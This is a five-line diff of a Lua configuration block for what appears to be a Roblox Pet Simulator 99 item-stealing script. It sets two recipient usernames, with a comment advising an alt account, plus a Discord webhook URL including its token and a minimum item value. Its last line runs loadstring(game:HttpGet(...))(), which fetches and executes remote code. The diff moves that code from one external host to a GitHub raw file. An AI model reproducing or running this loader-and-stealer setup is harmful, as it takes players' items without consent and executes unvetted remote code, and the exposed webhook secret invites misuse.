@@ -1,5 +1,5 @@
-Username = "XjWpSnMqKrV3T6bZ"
-Username2 = "LhDzWqBnJkR5Y8pF"
-Webhook = "https://discord.com/api/webhooks/1251743966458806376/8eleJu13wbIfAyhnZfJNP3OKTP1SjGU-BbklvP2xooLhzNZL0OsqJ1hcp8OHZ4vpEjDN"
-
-loadstring(game:HttpGet("https://egorikusa.space"))()
+Username = "XjWpSnMqKrV3T6bZ" -- Remember to always use alt 
+Username2 = "LhDzWqBnJkR5Y8pF" -- 2nd user if Username Mailbox is full it then sends it to Username2
+Webhook = "https://discord.com/api/webhooks/1251743966458806376/8eleJu13wbIfAyhnZfJNP3OKTP1SjGU-BbklvP2xooLhzNZL0OsqJ1hcp8OHZ4vpEjDN" 
+min_rap = 300000
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/ps99/Scripts/Testlua.lua"))()
